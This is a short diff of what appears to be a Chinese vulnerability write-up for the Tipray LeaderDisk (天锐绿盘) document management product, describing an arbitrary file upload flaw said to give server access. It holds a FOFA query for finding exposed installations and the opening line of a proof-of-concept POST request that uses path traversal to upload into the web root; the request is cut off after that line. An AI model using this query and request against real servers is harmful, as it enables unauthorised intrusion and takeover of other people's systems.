@@ -3,9 +3,9 @@
 天锐绿盘云文档安全管理存在任意文件上传漏洞，可以获取服务器权限
 
 ## fofa
-
+```
 body="/lddsm/" || title="天锐绿盘" || title=="Tipray LeaderDisk"||body="location.href=location.href+\"lddsm\""
-
+```
 ## poc
 ```javascript
 POST /lddsm/service/../admin/activiti/uploadFolder.do?taskId=../webapps/ROOT/&relativepath=1&path=1 HTTP/1.1
